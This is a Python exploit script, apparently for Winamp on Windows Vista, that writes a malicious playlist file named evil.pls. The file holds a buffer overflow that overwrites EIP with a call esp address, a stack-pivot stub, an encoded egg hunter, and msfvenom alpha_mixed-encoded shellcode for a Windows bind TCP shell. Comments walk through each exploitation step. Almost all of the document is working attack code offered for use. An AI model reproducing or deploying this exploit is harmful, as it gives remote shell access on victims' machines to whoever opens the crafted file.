#!/usr/bin/python -w
  
# Dustin Silveri
# van6uard

#-------------------------------------------------#
# Windows Vista Ultimate x86
# [+] bad characters = 
# call esp |  1073614F
# we only control 11 bytes of ESP buffer.  Plan is to jmp to esp, then have 11 bytes to execute.
# sub esp,58
# sub esp,58
# jmp esp
# nasm > sub esp,58
# 00000000  83EC3A            sub esp,byte +0x3a # change back to '58' \x83\xec\x58
# nasm > jmp esp
# 00000000  FFE4              jmp esp
# nasm > 
#-------------------------------------------------#

# steps: ESP points to small 11 byte buffer
# 1. overwrite eip with 'call esp' function to jmp to esp buffer
# 2. use 11 byte esp buffer to jmp farther back. \x83\xec\x58\x83\xec\x58\xff\xe4
# 3. place egg hunter to get executed.
# 4. place egg and shellcode in first part of buffer to get executed. "w00tw00t" + shellcode + "\x90"*(856-8-718)
# had to use msfvenom -e x86/alpha_mixed to bypass bad characters.

cat egg.bin | msfvenom -a x86 --platform windows -e x86/alpha_mixed -f py
#Attempting to read payload from STDIN...
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 126 (iteration=0)
#x86/alpha_mixed chosen with final size 126
#Payload size: 126 bytes
#Final size of py file: 614 bytes
hunter =  (
"\x89\xe3\xd9\xee\xd9\x73\xf4\x5e\x56\x59\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
"\x58\x50\x38\x41\x42\x75\x4a\x49\x43\x56\x4e\x61\x69"
"\x5a\x59\x6f\x54\x4f\x72\x62\x61\x42\x72\x4a\x47\x72"
"\x52\x78\x4a\x6d\x66\x4e\x45\x6c\x63\x35\x32\x7a\x63"
"\x44\x48\x6f\x4f\x48\x30\x77\x64\x70\x34\x70\x52\x54"
"\x6e\x6b\x5a\x5a\x4e\x4f\x53\x45\x49\x7a\x4c\x6f\x32"
"\x55\x68\x67\x6b\x4f\x49\x77\x41\x41"
)

#root@kali:/mnt/hgfs/P3nt3st/Projects/winamp# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -e x86/alpha_mixed -f c
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 718 (iteration=0)
#x86/alpha_mixed chosen with final size 718
#Payload size: 718 bytes
#Final size of c file: 3040 bytes
shellcode = ( 
"\x89\xe1\xda\xc3\xd9\x71\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x59\x6c\x78\x68\x6d\x52\x47\x70\x67\x70\x37\x70\x33\x50\x4e"
"\x69\x4d\x35\x50\x31\x79\x50\x43\x54\x4c\x4b\x76\x30\x76\x50"
"\x6c\x4b\x31\x42\x54\x4c\x4e\x6b\x43\x62\x67\x64\x4c\x4b\x64"
"\x32\x56\x48\x76\x6f\x68\x37\x33\x7a\x54\x66\x70\x31\x39\x6f"
"\x6e\x4c\x77\x4c\x63\x51\x51\x6c\x64\x42\x56\x4c\x77\x50\x79"
"\x51\x6a\x6f\x76\x6d\x33\x31\x6b\x77\x4a\x42\x6b\x42\x71\x42"
"\x36\x37\x6e\x6b\x46\x32\x54\x50\x4e\x6b\x50\x4a\x77\x4c\x6c"
"\x4b\x62\x6c\x37\x61\x70\x78\x6b\x53\x50\x48\x75\x51\x4e\x31"
"\x32\x71\x4e\x6b\x31\x49\x65\x70\x33\x31\x68\x53\x6c\x4b\x30"
"\x49\x66\x78\x59\x73\x35\x6a\x47\x39\x4e\x6b\x44\x74\x6e\x6b"
"\x43\x31\x5a\x76\x56\x51\x39\x6f\x4c\x6c\x6b\x71\x38\x4f\x44"
"\x4d\x45\x51\x68\x47\x76\x58\x4b\x50\x61\x65\x4a\x56\x56\x63"
"\x51\x6d\x5a\x58\x65\x6b\x73\x4d\x31\x34\x32\x55\x39\x74\x32"
"\x78\x4c\x4b\x56\x38\x77\x54\x55\x51\x4e\x33\x70\x66\x6e\x6b"
"\x34\x4c\x52\x6b\x6e\x6b\x52\x78\x45\x4c\x35\x51\x39\x43\x4e"
"\x6b\x63\x34\x4e\x6b\x57\x71\x6a\x70\x6b\x39\x67\x34\x54\x64"
"\x67\x54\x51\x4b\x51\x4b\x70\x61\x56\x39\x70\x5a\x53\x61\x39"
"\x6f\x49\x70\x33\x6f\x51\x4f\x42\x7a\x4c\x4b\x52\x32\x5a\x4b"
"\x6e\x6d\x33\x6d\x43\x58\x45\x63\x64\x72\x53\x30\x37\x70\x51"
"\x78\x30\x77\x50\x73\x54\x72\x73\x6f\x31\x44\x32\x48\x52\x6c"
"\x70\x77\x35\x76\x64\x47\x39\x6f\x6b\x65\x6c\x78\x4e\x70\x47"
"\x71\x75\x50\x73\x30\x55\x79\x6b\x74\x71\x44\x32\x70\x42\x48"
"\x44\x69\x6f\x70\x42\x4b\x37\x70\x69\x6f\x5a\x75\x61\x7a\x44"
"\x48\x50\x59\x76\x30\x7a\x42\x4b\x4d\x61\x50\x52\x70\x51\x50"
"\x62\x70\x72\x48\x7a\x4a\x66\x6f\x6b\x6f\x6d\x30\x49\x6f\x4a"
"\x75\x6c\x57\x30\x68\x57\x72\x43\x30\x32\x31\x61\x4c\x4b\x39"
"\x5a\x46\x30\x6a\x66\x70\x63\x66\x42\x77\x55\x38\x6b\x72\x39"
"\x4b\x55\x67\x52\x47\x79\x6f\x7a\x75\x71\x47\x55\x38\x48\x37"
"\x48\x69\x35\x68\x49\x6f\x69\x6f\x6b\x65\x66\x37\x50\x68\x54"
"\x34\x78\x6c\x55\x6b\x49\x71\x79\x6f\x79\x45\x42\x77\x4a\x37"
"\x52\x48\x70\x75\x52\x4e\x30\x4d\x71\x71\x69\x6f\x48\x55\x65"
"\x38\x35\x33\x70\x6d\x55\x34\x55\x50\x6b\x39\x39\x73\x76\x37"
"\x63\x67\x30\x57\x75\x61\x6c\x36\x31\x7a\x37\x62\x52\x79\x50"
"\x56\x58\x62\x69\x6d\x62\x46\x79\x57\x71\x54\x55\x74\x57\x4c"
"\x76\x61\x37\x71\x6c\x4d\x51\x54\x34\x64\x64\x50\x6f\x36\x77"
"\x70\x47\x34\x52\x74\x70\x50\x56\x36\x32\x76\x46\x36\x62\x66"
"\x31\x46\x30\x4e\x43\x66\x43\x66\x51\x43\x62\x76\x63\x58\x34"
"\x39\x4a\x6c\x45\x6f\x4b\x36\x59\x6f\x5a\x75\x4b\x39\x4d\x30"
"\x42\x6e\x36\x36\x51\x56\x39\x6f\x56\x50\x42\x48\x55\x58\x4d"
"\x57\x37\x6d\x35\x30\x79\x6f\x38\x55\x4f\x4b\x6b\x50\x45\x4d"
"\x55\x7a\x47\x7a\x71\x78\x6e\x46\x4d\x45\x4d\x6d\x4d\x4d\x6b"
"\x4f\x7a\x75\x75\x6c\x76\x66\x53\x4c\x44\x4a\x4d\x50\x4b\x4b"
"\x59\x70\x74\x35\x56\x65\x6f\x4b\x73\x77\x72\x33\x30\x72\x72"
"\x4f\x30\x6a\x35\x50\x56\x33\x4b\x4f\x4e\x35\x41\x41"
)

start = "[playlist]\r\nFile1=\\\\"
#nop = "\x90" * 856
nop = "w00tw00t" + shellcode + "\x90"*(856-8-718)
#shellcode = "\x90" * 60 + hunter + "\x41"* (166-126)
shellcode = hunter + "\x41"*(166-126)
jmp = "\x4f\x61\x73\x10"+"\x83\xec\x58\x83\xec\x58\xff\xe4"+"\x90\x90\x90\x90"
end = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"



filename="evil.pls"

textfile = open(filename , 'w')
textfile.write(start + nop + shellcode + jmp + end)
textfile.close()

